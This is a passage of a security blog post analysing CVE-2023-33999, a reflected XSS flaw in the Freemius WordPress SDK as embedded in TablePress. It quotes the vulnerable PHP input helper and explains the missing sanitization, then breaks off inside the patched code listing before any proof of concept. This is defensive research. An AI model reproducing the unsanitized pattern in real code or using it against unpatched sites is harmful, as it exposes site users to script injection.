<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2023-33999 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in Freemius SDK."><meta name="keywords" content='analyst, plugin, xss'>
  <meta itemprop="name" content="CVE-2023-33999 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in Freemius SDK.">
  <meta itemprop="datePublished" content="2025-12-05T20:00:00+07:00">
  <meta itemprop="dateModified" content="2025-12-05T15:17:41+07:00">
  <meta itemprop="wordCount" content="1833">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-12-05-cve-2023-33999/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Xss"><meta property="og:url" content="http://localhost:1313/posts/2025-12-05-cve-2023-33999/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2023-33999 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in Freemius SDK.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-05T20:00:00+07:00">
    <meta property="article:modified_time" content="2025-12-05T15:17:41+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Xss">
    <meta property="og:image" content="http://localhost:1313/posts/2025-12-05-cve-2023-33999/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-12-05-cve-2023-33999/app.png">
  <meta name="twitter:title" content="CVE-2023-33999 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in Freemius SDK.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2025-12-05-cve-2023-33999/" title="CVE-2023-33999 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2025-12-05-cve-2025-48140/" title="CVE-2024-8672 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2025-12-06-cve-2024-11600/" title="CVE-2024-11600 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2025-12-05-cve-2023-33999/index.md" title="CVE-2023-33999 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2023-33999 Analysis \u0026 POC",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/2025-12-05-cve-2023-33999\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, xss","wordcount":  1833 ,
    "url": "http:\/\/localhost:1313\/posts\/2025-12-05-cve-2023-33999\/","datePublished": "2025-12-05T20:00:00+07:00","dateModified": "2025-12-05T15:17:41+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in Freemius SDK."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-pencil fa-beat fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Select Language" title="Select Language"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><span class="text-secondary" title="English">English</span></li><li class="menu-item"><a href="/vi/posts/2025-12-05-cve-2023-33999/" class="menu-link" title="Vietnamese">Vietnamese</a></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Cancel
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-pencil fa-beat fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Select Language" title="Select Language">English<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-12-05-cve-2023-33999/" selected disabled>English</option><option value="/vi/posts/2025-12-05-cve-2023-33999/">Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Related Content</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/posts/2025-12-06-cve-2024-11600/" title="CVE-2024-11600 Analysis &amp; POC">CVE-2024-11600 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-12-05-cve-2025-48140/" title="CVE-2024-8672 Analysis &amp; POC">CVE-2024-8672 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-12-04-cve-2024-8672/" title="CVE-2024-8672 Analysis &amp; PoC">CVE-2024-8672 Analysis &amp; PoC</a></li><li class="related-item">
              <a href="/posts/2025-12-03-cve-2025-30911/" title="CVE-2025-30911 Analysis &amp; POC">CVE-2025-30911 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-12-02-cve-2025-52756/" title="CVE-2025-52756 Analysis &amp; POC">CVE-2025-52756 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-12-01-cve-2025-3053/" title="CVE-2025-3053 Analysis &amp; POC">CVE-2025-3053 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-27-cve-2025-13035/" title="CVE-2025-13035 Analysis &amp; POC">CVE-2025-13035 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2023-33999 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Author" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/cve-analysis/" class="post-category" title="Category - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="published on 2025-12-05 20:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-12-05">2025-12-05</time></span>&nbsp;<span title="Updated on 2025-12-05 15:17:41"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-12-05">2025-12-05</time></span>&nbsp;<span title="1833 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1900 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>9 minutes</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="eager" src='/posts/2025-12-05-cve-2023-33999/app.png' sizes="(max-width: 680px) 100vw, (max-width: 960px) 80vw, (max-width: 1440px) 56vw, 800px" alt="/posts/2025-12-05-cve-2023-33999/app.png" height="1005" width="1915"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#about-freemius-sdk">About Freemius SDK</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#poc">PoC</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>Freemius SDK for WordPress</strong> does not properly <strong>sanitize</strong> input data or <strong>escape</strong> output data, leading to a <strong>Reflected Cross-Site Scripting (XSS)</strong> vulnerability. This directly affects <strong>more than 1,000 plugins and themes</strong> using this SDK.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93/" target="_blank" rel="external nofollow noopener noreferrer">CVE-2023-33999</a></li>
<li><strong>Vulnerability Type</strong>: Cross Site Scripting</li>
<li><strong>Affected Versions</strong>: &lt;= 2.5.9</li>
<li><strong>Patched Versions</strong>: 2.5.10</li>
<li><strong>CVSS severity</strong>: Medium (6.1)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://freemius.com/help/documentation/wordpress-sdk/" target="_blank" rel="external nofollow noopener noreferrer">Freemius SDK for WordPress</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>
<p><strong>Local WordPress &amp; Debugging</strong></p>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/" target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/" target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li>
<p><strong>Plugin Version</strong> - <strong>TablePress</strong>:</p>
<ul>
<li><code>2.1.4</code> – <strong>vulnerable</strong></li>
<li><code>2.1.5</code> – <strong>patched</strong></li>
</ul>
</li>
<li>
<p><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/" target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> or any other diff tool.</p>
</li>
</ul>
<h2 class="heading-element" id="about-freemius-sdk"><span>About Freemius SDK</span>
  <a href="#about-freemius-sdk" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>Freemius SDK</strong> is a library (Software Development Kit) for <strong>WordPress</strong>, helping plugin and theme developers easily add the following features to their products:</p>
<ul>
<li><strong>License management</strong></li>
<li>Handling <strong>freemium / premium</strong> versions</li>
<li>Allowing users to <strong>connect accounts (opt-in)</strong></li>
<li>Collecting <strong>usage statistics (analytics)</strong></li>
<li>Managing <strong>payments and renewals</strong></li>
<li>Displaying <strong>upsell / upgrade</strong> in the WordPress dashboard</li>
</ul>
<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Note</p><p><strong>Freemius SDK</strong> is not a standalone plugin; it is embedded directly into the source code of other plugins or themes. Therefore, when a vulnerability exists in <strong>Freemius SDK</strong>, many products are affected. The plugin <a href="https://wordpress.org/plugins/tablepress/" target="_blank" rel="external nofollow noopener noreferrer"><strong>TablePress</strong></a> is one of the impacted cases, so it was chosen for analysis.</p></div><h2 class="heading-element" id="cause"><span>Cause</span>
  <a href="#cause" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>In the vulnerable version v2.5.9:</strong></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="freemius/includes/fs-core-functions.php v2.5.9" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">freemius/includes/fs-core-functions.php v2.5.9</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * A helper method to fetch GET/POST user input with an optional default value when the input is not set.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @author Vova Feldman (@svovaf)
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string      $key
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param mixed       $def
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string|bool $type Since 1.2.1.7 - when set to &#39;get&#39; will look for the value passed via querystring, when
</span></span></span><span class="line"><span class="cl"><span class="sd"> *                          set to &#39;post&#39; will look for the value passed via the POST request&#39;s body, otherwise,
</span></span></span><span class="line"><span class="cl"><span class="sd"> *                          will check if the parameter was passed in any of the two.
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @return mixed
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fs_request_get</span><span class="p">(</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$def</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$type</span> <span class="o">=</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_string</span><span class="p">(</span> <span class="nv">$type</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$type</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span> <span class="nv">$type</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">     * Note to WordPress.org Reviewers:
</span></span></span><span class="line"><span class="cl"><span class="sd">     *  This is a helper method to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&#39;s usage.
</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="nv">$type</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;post&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">:</span> <span class="nv">$def</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;get&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">:</span> <span class="nv">$def</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">:</span> <span class="nv">$def</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>The <code>fs_request_get()</code> function is used to <strong>retrieve the value of a parameter from a user request</strong> (GET, POST, or both), based on the provided key name. If the parameter does not exist, the function returns the default value. The <code>$type</code> parameter allows explicitly specifying whether the data source is <code>GET</code>, <code>POST</code>, or all (<code>REQUEST</code>).</p>
<div class="details admonition bug open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-bug" aria-hidden="true"></i>Bug</div>
  <div class="details-content">
    <div class="admonition-content"><p>The returned data is not sanitized or escaped. If this value is printed to the browser (for example, using <code>echo</code>) without proper handling, an attacker can inject malicious JavaScript code through request parameters, leading to a <strong>Reflected Cross-Site Scripting (XSS)</strong> vulnerability.</p></div>
  </div>
</div><p><strong>Patch v2.5.9:</strong></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="freemius/includes/fs-core-functions.php v2.5.10" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">freemius/includes/fs-core-functions.php v2.5.10</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
